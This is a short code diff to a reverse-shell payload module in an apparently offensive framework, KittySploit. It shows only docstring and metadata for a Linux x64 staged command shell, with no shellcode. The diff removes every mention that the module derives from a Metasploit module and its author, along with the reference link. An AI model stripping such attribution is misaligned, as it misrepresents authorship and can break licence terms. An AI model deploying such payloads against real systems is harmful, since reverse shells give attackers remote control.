@@ -14,7 +14,6 @@ It performs:
 This is typically used after a stager has established the connection.
 The socket file descriptor is expected to be 3 (after stdin=0, stdout=1, stderr=2).
 
-Original Metasploit module: payload/linux/x64/shell/reverse_tcp
 """
 
 from kittysploit import *
@@ -27,7 +26,7 @@ class Module(Payload):
     __info__ = {
         'name': 'Linux x64 Command Shell Stage',
         'description': 'Linux x64 shell stage - expects socket fd 3 to be connected (staged)',
-        'author': 'KittySploit Team (based on Metasploit module by ricky)',
+        'author': 'KittySploit Team',
         'version': '1.0.0',
         'category': 'singles',
         'arch': Arch.X64,
@@ -35,9 +34,6 @@ class Module(Payload):
         'listener': 'listeners/multi/reverse_tcp',
         'handler': Handler.REVERSE,
         'session_type': SessionType.SHELL,
-        'references': [
-            'https://github.com/rapid7/metasploit-framework'
-        ]
     }
     
     lhost = OptString('127.0.0.1', 'Connect to IP address', True)
